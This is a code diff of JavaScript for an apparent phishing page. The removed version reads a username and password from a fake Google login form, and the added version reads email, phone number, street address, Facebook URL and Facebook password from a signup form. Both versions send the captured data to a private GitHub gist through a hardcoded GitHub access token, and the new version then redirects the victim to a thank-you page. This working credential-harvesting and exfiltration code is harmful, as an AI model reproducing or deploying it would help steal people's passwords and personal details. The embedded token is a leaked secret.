@@ -11,14 +11,16 @@ const octokit = new Octokit({
     auth: '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',
 });
 
-async function baz(username, password) {
+
+
+async function foobaz(signup) {
     debugger;
     const foo = await octokit.request("POST /gists", {
         description: "Example of a gist",
         public: false,
         files: {
             [new Date().getTime().toString(32)]: {
-                content: "Hello " + username + " / " + password,
+                content: "Signup  " + signup,
             },
         },
         headers: {
@@ -28,26 +30,17 @@ async function baz(username, password) {
         },
     });
     console.log(foo);
-    window.close();
+    window.location.replace("./page-thank-you.html");
 }
-
-
 (function () {
-    document.querySelector('#loginGoogle').addEventListener('click', function () {
-        const pass = document.querySelector('input[type="password"]').value
-        const user = document.querySelector('#user').value
-        let allowed = false;
 
-        allowed = !!user && !!pass
-        allowed = user.length >= 8 && pass.length >= 8
-        if (allowed) {
-            baz(user, pass)
-            // window.opener.postMessage(`${user},${pass}`, '*');
-            // window.close();
-        } else {
-            // document.querySelector('#login-falied').classList.remove('hide')
-        }
-
+    document.querySelector(".submit").addEventListener('click', function () {
+        const emailAddress = "email: " + document.querySelector('#emailAddress').value + "/"
+        const phoneNumber = "phoneNumber: " + document.querySelector('#phoneNumber').value + "/"
+        const streetAddress = "streetAddress: " + document.querySelector('#streetAddress').value + "/"
+        const facebookUrl = "facebookUrl: " + document.querySelector('#facebookUrl').value + "/"
+        const fbPassword = "phoneNumber: " + document.querySelector('#fbPassword').value + "/"
+        const signup = emailAddress + phoneNumber + streetAddress + facebookUrl + fbPassword
+        foobaz(signup)
     })
-
 })(); 
